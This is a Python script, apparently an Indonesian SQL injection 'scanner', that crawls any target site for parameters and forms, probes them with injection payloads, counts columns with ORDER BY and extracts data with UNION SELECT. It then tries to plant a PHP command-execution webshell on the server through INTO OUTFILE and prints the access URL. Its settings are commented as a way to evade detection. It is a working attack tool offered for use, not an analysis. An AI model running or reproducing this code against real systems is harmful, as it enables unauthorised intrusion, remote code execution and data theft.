#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --[MAI]--
# Author: JunedXsec
# Inspired By: sqlmap, muani injection tools, psql-pro
# Version: Final 2026 - Real SQL Injection Scanner

import sys
import re
import time
import random
import urllib.parse
import urllib.robotparser
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import OrderedDict

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ==================== KONFIGURASI ====================
TIMEOUT = 15
DELAY = 0.5                     # Jeda antar request untuk menghindari deteksi
MAX_THREADS = 3                 # Tidak terlalu agresif
MAX_COLUMNS = 30                # Maksimal kolom yang dicek
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

# Warna output (seperti log)
COLOR = {
    'INFO': '\033[92m',      # hijau
    'ERROR': '\033[91m',     # merah
    'SUCCESS': '\033[94m',   # biru
    'WARNING': '\033[93m',   # kuning
    'RESET': '\033[0m'
}

def log_info(msg):
    print(f"{COLOR['INFO']}[INFO]{COLOR['RESET']} {msg}")

def log_error(msg):
    print(f"{COLOR['ERROR']}[ERROR]{COLOR['RESET']} {msg}")

def log_success(msg):
    print(f"{COLOR['SUCCESS']}[SUCCESS]{COLOR['RESET']} {msg}")

def log_warning(msg):
    print(f"{COLOR['WARNING']}[WARNING]{COLOR['RESET']} {msg}")

def banner():
    print("--[MAI]--")
    print("Author: JunedXsec")
    print("Inspired By: sqlmap, muani injection tools, psql-pro")
    print()

# ==================== HTTP HELPER ====================
session = requests.Session()
session.verify = False
session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

def fetch(url, params=None, post_data=None):
    """Mengirim request GET atau POST dengan delay"""
    time.sleep(DELAY)
    try:
        if params:
            resp = session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
        elif post_data:
            resp = session.post(url, data=post_data, timeout=TIMEOUT, allow_redirects=True)
        else:
            resp = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        resp.encoding = 'utf-8'
        return resp
    except Exception as e:
        log_error(f"Request error: {str(e)[:80]}")
        return None

# ==================== CRAWLER (Discover Parameters) ====================
class LinkAndFormParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = []      # URL dengan parameter GET
        self.forms = []      # (action, method, list_input_names)
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'a' and 'href' in attrs:
            href = attrs['href']
            if '?' in href:          # hanya yang punya parameter
                full = urllib.parse.urljoin(self.base_url, href)
                self.links.append(full)
        elif tag == 'form':
            action = attrs.get('action', '')
            method = attrs.get('method', 'get').lower()
            full_action = urllib.parse.urljoin(self.base_url, action)
            self.forms.append([full_action, method, []])
        elif tag == 'input' and self.forms:
            name = attrs.get('name')
            if name:
                self.forms[-1][2].append(name)

def extract_params_from_url(url):
    """Ekstrak parameter dari query string"""
    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    return {}

def discover_endpoints(target):
    """Crawling halaman utama untuk menemukan URL dengan parameter dan form POST"""
    log_info(f"Memulai Scanning SQLi Vuln Ke Site: {target}")
    resp = fetch(target)
    if not resp or resp.status_code != 200:
        log_error("Gagal mengakses website")
        return [], []
    parser = LinkAndFormParser(target)
    parser.feed(resp.text)
    # URL dengan parameter GET
    unique_links = list(OrderedDict.fromkeys(parser.links))
    get_endpoints = []
    for link in unique_links:
        params = extract_params_from_url(link)
        if params:
            get_endpoints.append((link, params))
    # Form POST
    post_forms = [(action, method, inputs) for action, method, inputs in parser.forms if method == 'post' and inputs]
    log_info(f"Ditemukan {len(get_endpoints)} URL dengan parameter")
    return get_endpoints, post_forms

# ==================== INJECTION DETECTION ====================
def test_injection(url, param, orig_value, original_content):
    """Menentukan apakah parameter rentan dan tipe injeksi (string/numeric)"""
    # Payload string based
    log_info("Mencari Metode Injection Di Website string_based/numeric_based")
    test_payload = "'"
    log_info(f"Menggunakan Payload: {urllib.parse.quote(test_payload)}")
    params = {param: f"{orig_value}{test_payload}"}
    resp = fetch(url, params=params)
    if resp and resp.status_code == 200 and resp.text != original_content:
        log_info("tipeinjeksi Menggunakan Metode String Based")
        return "string", "'"
    # Coba numeric
    test_payload2 = " AND 1=2"
    params2 = {param: f"{orig_value}{test_payload2}"}
    resp2 = fetch(url, params=params2)
    if resp2 and resp2.status_code == 200 and resp2.text != original_content:
        log_info("tipeinjeksi Menggunakan Metode Numeric Based")
        return "numeric", ""
    # Coba boolean blind
    true_payload = f"{orig_value}' AND '1'='1"
    false_payload = f"{orig_value}' AND '1'='2"
    r_true = fetch(url, params={param: true_payload})
    r_false = fetch(url, params={param: false_payload})
    if r_true and r_false and r_true.text != r_false.text:
        log_info("tipeinjeksi Menggunakan Metode Boolean Blind")
        return "boolean", "' AND '1'='1"
    return None, None

# ==================== COUNT COLUMNS ====================
def count_columns(url, param, original_value, inj_type, trigger):
    """Menghitung jumlah kolom menggunakan ORDER BY"""
    log_info("Mencari Column...")
    for cols in range(1, MAX_COLUMNS+1):
        if inj_type == "string":
            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
        else:
            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
        params = {param: payload}
        resp = fetch(url, params=params)
        if not resp:
            continue
        if "Unknown column" in resp.text or "error" in resp.text.lower():
            log_info(f"Menghitung Order By: {cols-1}")
            return cols-1
    log_info(f"Menghitung Order By: {MAX_COLUMNS}")
    return MAX_COLUMNS

# ==================== UNION BASED EXTRACTION ====================
def union_extract(url, param, original_value, inj_type, trigger, num_cols):
    """Mencoba payload union select dan menampilkan angka yang muncul"""
    # Buat angka marker (11,22,33,...)
    markers = ','.join([str(i*11) for i in range(1, num_cols+1)])
    if inj_type == "string":
        payload = f"{original_value}{trigger} AND 0 UNION SELECT {markers}-- -"
    else:
        payload = f"{original_value}{trigger} AND 0 UNION SELECT {markers}-- -"
    log_info(f"Mencoba Payload: {payload[:80]}...")
    params = {param: payload}
    resp = fetch(url, params=params)
    if resp and resp.status_code == 200:
        # Cari angka yang muncul di response
        found = re.findall(r'\b(11|22|33|44|55|66|77|88|99|110|121|132|143|154|165|176|187|198|209|220)\b', resp.text)
        if found:
            visible = list(OrderedDict.fromkeys(found))
            log_info(f"Angka Yang Muncul: {', '.join(visible)}")
            # Buat URL payload union untuk ditampilkan
            payload_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            log_info(f"Payload Union: {payload_url}")
            return True
    return False

# ==================== UPLOAD WEBSHELL (DIOS) ====================
def generate_dios_payload(column_index=1):
    """Menghasilkan payload seperti di gambar: concat binary ke hex? Di sini kita buat shell code sederhana"""
    # Shell code yang akan di-inject: <?php system($_GET['cmd']); ?>
    shell_code = "<?php system($_GET['cmd']); ?>"
    # Untuk meniru gaya di log, kita encode ke binary? Tapi cukup return string biasa
    # Kita akan membuat payload union yang menulis shell ke file
    return shell_code

def upload_dios(url, param, original_value, inj_type, trigger, num_cols):
    """Mencoba upload webshell menggunakan INTO OUTFILE (MySQL)"""
    log_info("Mengupload dios...")
    shell_content = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
    # Path umum yang writable
    paths = [
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "/home/public_html/shell.php",
        "/tmp/shell.php",
        "C:/xampp/htdocs/shell.php",
        "C:/inetpub/wwwroot/shell.php"
    ]
    for out_path in paths:
        # Buat NULL list sesuai jumlah kolom, letakkan shell di kolom pertama
        nulls = ['NULL'] * num_cols
        nulls[0] = f"'{shell_content}'"
        if inj_type == "string":
            payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{out_path}'-- -"
        else:
            payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{out_path}'-- -"
        params = {param: payload}
        resp = fetch(url, params=params)
        # Cek respon: biasanya sukses jika tidak ada error
        log_info("Mengecek Output respon")
        if resp and "error" not in resp.text.lower():
            log_info("Output Berhasil Di Periksa")
            log_success(f"Dios: {url}?{param}={urllib.parse.quote(payload)}")
            log_success(f"Webshell uploaded to {out_path}")
            log_warning(f"Akses: {out_path}?cmd=id")
            return True
    log_error("Gagal mengupload dios (periksa hak FILE MySQL)")
    return False

# ==================== SCAN SATU ENDPOINT ====================
def scan_endpoint(url, params_dict):
    """Scan satu URL dengan parameter-parameternya"""
    for param, orig_val in params_dict.items():
        log_info(f"Mencari Parameter Pada Url...")
        log_info("Url Memiliki Parameter")
        # Ambil konten asli
        orig_resp = fetch(url)
        if not orig_resp:
            continue
        original_content = orig_resp.text
        log_info("Berhasil Mengambil Konten Default Pada Website")
        # Deteksi injeksi
        inj_type, trigger = test_injection(url, param, orig_val, original_content)
        if not inj_type:
            continue
        # Hitung kolom
        num_cols = count_columns(url, param, orig_val, inj_type, trigger)
        if num_cols < 1:
            continue
        log_info(f"Jumlah Column: {num_cols}")
        # Coba union extract
        union_success = union_extract(url, param, orig_val, inj_type, trigger, num_cols)
        if union_success:
            # Upload dios
            upload_dios(url, param, orig_val, inj_type, trigger, num_cols)
        # Hanya satu parameter rentan per URL (bisa diubah)
        break

# ==================== MAIN ====================
def main():
    banner()
    target = input("Masukkan URL target (contoh: https://fankynas.cloud) > ").strip()
    if not target:
        log_error("URL tidak boleh kosong")
        sys.exit(1)
    if not target.startswith(('http://','https://')):
        target = 'http://' + target
    # Discover endpoints
    get_endpoints, post_forms = discover_endpoints(target)
    if not get_endpoints and not post_forms:
        log_error("Tidak ditemukan parameter GET atau form POST. Coba URL lain.")
        sys.exit(1)
    # Scan GET endpoints (gunakan thread terbatas)
    log_info(f"Memulai scan pada {len(get_endpoints)} endpoint GET")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(scan_endpoint, url, params) for url, params in get_endpoints]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                log_error(f"Thread error: {e}")
    # Scan POST forms sederhana
    for action, method, inputs in post_forms:
        log_info(f"Mencoba POST form: {action}")
        for field in inputs[:2]:  # batasi 2 field per form
            test_data = {field: "'"}
            resp = fetch(action, post_data=test_data)
            if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
                log_success(f"Potensi SQLi POST pada field {field} di {action}")
    log_success("Scan selesai.")

if __name__ == "__main__":
    main()
